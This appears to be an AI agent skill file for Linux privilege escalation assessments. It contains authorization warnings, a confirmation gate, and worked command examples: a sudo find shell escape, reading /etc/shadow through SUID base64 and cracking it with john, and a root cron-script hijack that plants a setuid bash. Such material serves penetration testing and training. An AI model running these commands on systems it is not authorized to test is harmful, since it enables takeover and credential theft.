---
name: linux-privilege-escalation
description: Execute systematic privilege escalation assessments on Linux systems to identify and exploit misconfigurations, vulnerable services, and security weaknesses that allow elevation from low-privilege user access to root-level control.
metadata:
  aas-risk: offensive
  aas-source: community
  aas-author: zebbern
  aas-date-added: '2026-02-27'
---

> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.

# Linux Privilege Escalation

## Detailed Guide

Read [the detailed guide](references/detailed-guide.md) before executing this skill. It retains the complete procedure and reference material. Treat its safety, prerequisites, and validation requirements as mandatory. For focused work, load the relevant sections; for end-to-end work, read the guide completely.

## Constraints and Guardrails

### Operational Boundaries
- Verify kernel exploits in test environment before production use
- Failed kernel exploits may crash the system
- Document all changes made during privilege escalation
- Maintain access persistence only as authorized

### Technical Limitations
- Modern kernels may have exploit mitigations (ASLR, SMEP, SMAP)
- AppArmor/SELinux may restrict exploitation techniques
- Container environments limit kernel-level exploits
- Hardened systems may have restricted sudo configurations

### Legal and Ethical Requirements
- Written authorization required before testing
- Stay within defined scope boundaries
- Report critical findings immediately
- Do not access data beyond scope requirements

## Examples

### Example 1: Sudo to Root via find

**Scenario**: User has sudo rights for find command

```bash
$ sudo -l
User user may run the following commands:
    (root) NOPASSWD: /usr/bin/find

$ sudo find . -exec /bin/bash \; -quit
# id
uid=0(root) gid=0(root) groups=0(root)
```

### Example 2: SUID base64 for Shadow Access

**Scenario**: base64 binary has SUID bit set

```bash
$ find / -perm -u=s -type f 2>/dev/null | grep base64
/usr/bin/base64

$ base64 /etc/shadow | base64 -d
root:$6$xyz...:18000:0:99999:7:::

# Crack offline with john
$ john --wordlist=rockyou.txt shadow.txt
```

### Example 3: Cron Job Script Hijacking

**Scenario**: Root cron job executes writable script

```bash
$ cat /etc/crontab
* * * * * root /opt/scripts/backup.sh

$ ls -la /opt/scripts/backup.sh
-rwxrwxrwx 1 root root 50 /opt/scripts/backup.sh

$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /opt/scripts/backup.sh

# Wait 1 minute
$ /tmp/bash -p
# id
uid=1000(user) gid=1000(user) euid=0(root)
```

## When to Use
This skill is applicable to execute the workflow or actions described in the overview.
